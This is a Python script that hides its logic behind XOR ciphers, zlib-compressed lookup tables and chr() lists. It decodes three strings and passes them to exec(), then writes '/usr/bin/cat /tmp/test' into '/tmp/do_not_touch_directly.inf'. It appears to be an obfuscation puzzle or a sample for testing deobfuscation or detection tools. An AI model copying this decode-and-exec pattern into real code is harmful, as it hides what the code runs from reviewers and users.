import string
from itertools import cycle
from zlib import decompress
from json import loads
import os

def w(a, b):
	return chr(ord(a) + ord(b))

def ww(a, b):
	return chr(ord(a) ^ ord(b))

def www(a, b):
	return chr(ord(a) * ord(b))

def wwww(a, b):
	return chr(ord(a) // ord(b))

def x(a):
	t = string.ascii_lowercase
	z = zip(a, cycle(t))
	return "".join(ww(zc, zd) for zc, zd in z)

def xx(a):
	t = string.ascii_uppercase
	z = zip(a, cycle(t))
	return "".join(ww(zc, zd) for zc, zd in z)

def xxx(a):
	t = string.ascii_letters
	z = zip(a, cycle(t))
	return "".join(ww(zc, zd) for zc, zd in z)

def xxxx(a):
	t = string.printable
	z = zip(a, cycle(t))
	return "".join(ww(zc, zd) for zc, zd in z)

def xxxxx(a):
	t = string.whitespace
	z = zip(a, cycle(t))
	return "".join(ww(zc, zd) for zc, zd in z)

gfefgsdf = "BC'w\x16C}h)}\x7f\x7f\x1cYfXdsh\x14"
#print(f"gfefgsdf = {gfefgsdf}")
#print(xxxx('VC]^\x14OZ^Z\x19\x08\x0f\x13\x0b\x17\x12G\x0c\x0c\t\x04\x01\x1d\x1c\n\x03\x02R\x12\x07U\x06\x1b'))
#exec(xxxx('VC]^\x14OZ^Z\x19\x08\x0f\x13\x0b\x17\x12G\x0c\x0c\t\x04\x01\x1d\x1c\n\x03\x02R\x12\x07U\x06\x1b'))

#print(xxxx('VC]^\x14_EXV\x19\x08\x0f\x13\x0b\x17\x12G\x04\x06\x0b\x0f\x1fM\x0f\x1cP\x01\x1d'))
#exec(xxxx('VC]^\x14_EXV\x19\x08\x0f\x13\x0b\x17\x12G\x04\x06\x0b\x0f\x1fM\x0f\x1cP\x01\x1d'))

'lambda x, y: y.join(x)'
#print((decompress(b'x\x9c\xcbI\xccMJIT\xa8\xd0Q\xa8\xb4R\xa8\xd4\xcb\xca\xcf\xcc\xd3\xa8\xd0\x04\x00U\x97\x079').decode()))
w = eval(decompress(b'x\x9c\xcbI\xccMJIT\xa8\xd0Q\xa8\xb4R\xa8\xd4\xcb\xca\xcf\xcc\xd3\xa8\xd0\x04\x00U\x97\x079').decode())
ee = b'x\x9cE\xd2gS\xc2@\x14\x85\xe1\xbf\x82\xb1\xa2\xa8\x894;\xf6\x82\xbd\x17\x82\x05\x15\x0bv\xc1\xae\xbf\xddy\xcf\x0c\xc7/\xcf\x9c\xecf\xef\xde\xec\xa6\x14\xc4\x8d0\x8c.\x82TB)\xcc\x92fa\x12z\x9b\x13Q\x8e\xb4\xe1\xc7\x01\xa7<\xe9K\x8f\x15<P\x8c=\x7f\xe6tNz\x85"|h\xe2\x1e\xb5\x7f\x12f@/\xc6u\xcc\xb8\xb3\x90\xd4\x02K\xd0\x07\xfb\xb0\xebWrNj\xaa\x1b\xb4l\rv\xa0\x0cj\xfe\x0ej0\x0c=\xf0\x06\xfd\xae\x92&u@\'\x1c\xc2\'\xcc\xc3\x1e\x8c\xc1\t,k\xd93.\xc06l\xc1\x11hb\x1c\x1a>\x90\x8a\x93vj\x85[8u\x0b\xff\xe7\xac\x0f\xb9\x84\'\x8f\r\x91"H{\xacJ\x1a\x81AXq)\x1d\xf2\x14\x8c\xc2\x95W\xe8\xce_@w\x95\xf5\n\xf5w\r7\x1aS\xe9vh\x83G(\x81&\xd6A\x1d}\xc34\xe8vW\xe1\x01~\xe0\xdd\x1b\xebr7\xbd\x9d>\xa4\xee\xd9\xa8\x99\xf2U\x8f\xe9`&\xe0\x17\x16\xa1\x0b\n0\x07\xbazu\xae\xdf\xe1\xd8\xe5\xb5[\xca\x8f*\x9ape\x1dV\x1c\x04\xe5?\xc1\xa0\x98\xa2'
#print(decompress(ee).decode())
e = loads(decompress(ee).decode())
#print(f"{e}")
erwqyuioa = "".join(e[ord(c)] for c in gfefgsdf)
print(f"erwqyuioa = {erwqyuioa}")
r = [25, 107, 68, 45, 122, 1, 31, 32, 10, 23, 18, 87, 90, 55, 79, 124, 69, 109, 7, 64, 105, 83, 5, 8, 126, 72, 111, 63, 13, 14, 0, 75, 125, 26, 127, 65, 92, 91, 46, 47, 115, 20, 33, 42, 123, 4, 28, 44, 34, 73, 38, 74, 24, 86, 120, 118, 77, 97, 41, 76, 81, 52, 61, 116, 112, 3, 80, 99, 21, 2, 117, 50, 56, 114, 16, 27, 54, 78, 101, 35, 96, 6, 106, 58, 57, 36, 30, 51, 29, 11, 48, 94, 12, 37, 59, 121, 53, 67, 119, 85, 22, 19, 95, 70, 82, 88, 89, 40, 66, 39, 100, 102, 93, 71, 60, 84, 108, 62, 15, 43, 104, 17, 49, 9, 98, 103, 113, 110]

s97 = '+XlR}f]\x13dsTy{}/+/\x14}CT}f_XB\x13)'
#print(f"s97 = {s97}")
s96 = 'Tyy}4}^II&{}*I"I{}II\x18{}\x04\x04I"J{}*\x04*\x04II\x18{}\x18v{}II"{}I"V{}aM{}\x18v{}II\x18{}IIV{}IIv{}\x18v%'
#print(f"s96 = {s96}")
ll = [['c', 'h', 'r', '(', '0', 'b', '0', '0', '1', '0', '1', '1', '1', '1', ')'], ['c', 'h', 'r', '(', '0', 'b', '0', '1', '1', '1', '0', '1', '0', '0', ')'], ['c', 'h', 'r', '(', '0', 'b', '0', '1', '1', '0', '1', '1', '0', '1', ')'], ['c', 'h', 'r', '(', '0', 'b', '0', '1', '1', '1', '0', '0', '0', '0', ')'], ['c', 'h', 'r', '(', '0', 'b', '0', '0', '1', '0', '1', '1', '1', '1', ')'], ['c', 'h', 'r', '(', '0', 'b', '0', '1', '1', '0', '0', '1', '0', '0', ')'], ['c', 'h', 'r', '(', '1', '1', '1', ')'], ['c', 'h', 'r', '(', '9', '5', ')'], ['c', 'h', 'r', '(', '1', '1', '0', ')'], ['c', 'h', 'r', '(', '1', '1', '1', ')'], ['c', 'h', 'r', '(', '+', '+', '+', '1', '1', '6', ')'], ['c', 'h', 'r', '(', '9', '5', ')'], ['c', 'h', 'r', '(', '1', '1', '6', ')'], ['c', 'h', 'r', '(', '1', '1', '1', ')'], ['c', 'h', 'r', '(', '1', '1', '7', ')'], ['c', 'h', 'r', '(', '9', '9', ')'], ['c', 'h', 'r', '(', '+', '+', '1', '0', '4', ')'], ['c', 'h', 'r', '(', '9', '5', ')'], ['c', 'h', 'r', '(', '1', '0', '0', ')'], ['c', 'h', 'r', '(', '1', '0', '5', ')'], ['c', 'h', 'r', '(', '1', '1', '4', ')'], ['c', 'h', 'r', '(', '+', '1', '0', '1', ')'], ['c', 'h', 'r', '(', '9', '9', ')'], ['c', 'h', 'r', '(', '1', '1', '6', ')'], ['c', 'h', 'r', '(', '0', 'x', '0', '0', '6', 'c', ')'], ['c', 'h', 'r', '(', '0', 'x', '0', '0', '7', '9', ')'], ['c', 'h', 'r', '(', '0', 'x', '0', '0', '2', 'e', ')'], ['c', 'h', 'r', '(', '0', 'x', '0', '0', '6', '9', ')'], ['c', 'h', 'r', '(', '0', 'x', '0', '0', '6', 'e', ')'], ['c', 'h', 'r', '(', '0', 'x', '0', '0', '6', '6', ')']]

def f2():
	return [eval(erwqyuioa)(sl) for sl in ll]

def f1():
	s = f2()
	print(f"s = {s}")

	s_ = "".join([eval(c) for c in s])
	print(f"s_ = {s_}")

	s98 = eval(erwqyuioa)(e[ord(c)] for c in s97)
	print(f"s98 = {s98}")
	s99 = eval(erwqyuioa)(e[ord(c)] for c in s96)
	print(f"s99 = {s99} //" + "/usr/bin/rgrep")
	s20 = xxxxx(xxx('.\r\x00\x05\x0bD0\x13' \
		'\n\x13\x05HoEK\x17\x15\x17=U$' \
		'\x18\x14\x06q\x10bo.' \
		'\'\x17o.e+(K7"5!.\x02>=q-\x05(x\x0e~C'))
	print(f"s20 = {s20}")

	s444 = '\n\t'
	print(f"s444 = {s444}")

	_s = w([s98, s99, s20], s444)
	print(f"_s = {_s}")
	exec(_s)
	#s__ = [112, +101, 114, --103, +-+-114, 47, 110, 105, 98, 47, 114, 115, 117, 47]
	#print("".join([chr(c) for c in reversed(s__)]))

	#print(xxxx('Y\\B\\FA\x16XK'))
	#exec(xxxx('Y\\B\\FA\x16XK'))
	with open(s_, 'w') as ofile:
		ofile.write("/usr/bin/cat /tmp/test")


	print(xxxx('_B\x1cAQXYA]\x11\x12=J'))
	#exec(xxxx('_B\x1cAQXYA]\x11\x12=J'))

if __name__ == '__main__':
	f1()
